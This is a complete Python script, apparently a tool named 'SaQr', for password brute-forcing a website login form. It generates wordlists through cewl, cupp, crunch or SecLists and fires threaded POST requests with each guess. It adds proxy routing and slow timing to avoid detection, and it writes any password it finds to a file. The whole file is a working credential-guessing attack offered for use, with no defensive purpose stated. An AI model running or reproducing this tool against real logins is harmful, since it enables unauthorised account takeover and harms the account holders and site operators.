#!/usr/bin/env python3
import os
import time
import threading
import requests

found_flag = threading.Event()

# ------------------------ Dependency Check ------------------------ #
def check_dependencies():
    try:
        import requests
    except ImportError:
        print("[!] 'requests' module not found. Installing...")
        os.system("pip install requests || pip3 install requests")

# ------------------------ Wordlist Toolkit ------------------------ #
def run_wordlist_toolkit():
    while True:
        print("""\033[96m
╔══════════════════════════════════════╗
║   SaQr Wordlist Toolkit - Generator  ║
╠══════════════════════════════════════╣
║ 1. Cewl (generate from website)      ║
║ 2. Cupp (custom personal info)       ║
║ 3. Crunch (brute-force patterns)     ║
║ 4. Seclists (Kali wordlists)         ║
║ 0. Back                              ║
╚══════════════════════════════════════╝\033[0m
""")
        choice = input(">> Choose [0-4]: ").strip()
        if choice == "1":
            url = input(">> Enter target URL: ")
            output = input(">> Output filename (e.g., site.txt): ")
            depth = input(">> Depth [default=2]: ") or "2"
            os.system(f"cewl -d {depth} -w {output} {url}")
            return output
        elif choice == "2":
            os.system("cupp -i")
            return input(">> Enter generated wordlist path (e.g., mylist.txt): ").strip()
        elif choice == "3":
            min_len = input(">> Min length: ")
            max_len = input(">> Max length: ")
            charset = input(">> Charset (e.g., abc123): ")
            output = input(">> Output file (e.g., crunch.txt): ")
            os.system(f"crunch {min_len} {max_len} {charset} -o {output}")
            return output
        elif choice == "4":
            os.system("ls /usr/share/seclists/Passwords | head -n 20")
            return input(">> Enter full path to selected wordlist: ").strip()
        elif choice == "0":
            return None
        else:
            print("[-] Invalid option.")

# ------------------------ Proxy Support ------------------------ #
def get_proxy():
    use_proxy = input(">> Use proxy? (y/n): ").strip().lower()
    if use_proxy == "y":
        proxy_type = input(">> Proxy type (http/socks4/socks5): ").strip()
        proxy_ip = input(">> Proxy IP (e.g., 127.0.0.1:9050): ").strip()
        proxy_dict = {
            "http": f"{proxy_type}://{proxy_ip}",
            "https": f"{proxy_type}://{proxy_ip}"
        }
        print(f"[+] Proxy enabled: {proxy_dict['http']}")
        return proxy_dict
    return None

# ------------------------ Brute Force Engine ------------------------ #
def attempt_login(session, login_url, user_field, pass_field, email, password, proxies, delay, tried):
    if found_flag.is_set():
        return
    payload = {
        user_field: email,
        pass_field: password
    }
    try:
        response = session.post(login_url, data=payload, proxies=proxies, timeout=10)
        if "incorrect" in response.text.lower() or "invalid" in response.text.lower():
            print(f"[{tried}] Tried: {password} -> ❌")
        else:
            print(f"\n[✔] Password FOUND: {password}")
            with open("found.txt", "w") as out:
                out.write(f"Target: {email}\nPassword: {password}\n")
            found_flag.set()
    except Exception as e:
        print(f"[{tried}] Error: {e}")
    time.sleep(delay)

def slow_brute_force(login_url, user_field, pass_field, email, wordlist_path, delay, proxies):
    session = requests.Session()
    threads = []
    tried = 0

    print("\n[+] Starting brute force...\n")
    with open(wordlist_path, "r", encoding="latin-1") as f:
        for line in f:
            if found_flag.is_set():
                break
            password = line.strip()
            tried += 1
            t = threading.Thread(target=attempt_login, args=(session, login_url, user_field, pass_field, email, password, proxies, delay, tried))
            threads.append(t)
            t.start()
            time.sleep(delay)

    for t in threads:
        t.join()

    if not found_flag.is_set():
        print("\n[-] Password not found in the wordlist.")

# ------------------------ Main ------------------------ #
def main():
    check_dependencies()
    print("\n--- SLOW BRUTE FORCE ATTACK + WORDLIST TOOLKIT ---")
    email = input(">> Target Email/Username: ").strip()

    gen_choice = input(">> Generate wordlist using built-in toolkit? (y/n): ").strip().lower()
    if gen_choice == "y":
        wordlist_path = run_wordlist_toolkit()
        if not wordlist_path or not os.path.isfile(wordlist_path):
            print("[-] Wordlist not found or invalid.")
            return
    else:
        wordlist_path = input(">> Enter path to your wordlist: ").strip()
        if not os.path.isfile(wordlist_path):
            print("[-] File not found.")
            return

    delay = float(input(">> Delay between attempts (e.g., 5): ").strip())
    login_url = input(">> Login POST URL (e.g., https://site.com/login): ").strip()
    user_field = input(">> Username Field Name (e.g., email): ").strip()
    pass_field = input(">> Password Field Name (e.g., password): ").strip()
    proxies = get_proxy()

    slow_brute_force(login_url, user_field, pass_field, email, wordlist_path, delay, proxies)

if __name__ == "__main__":
    main()
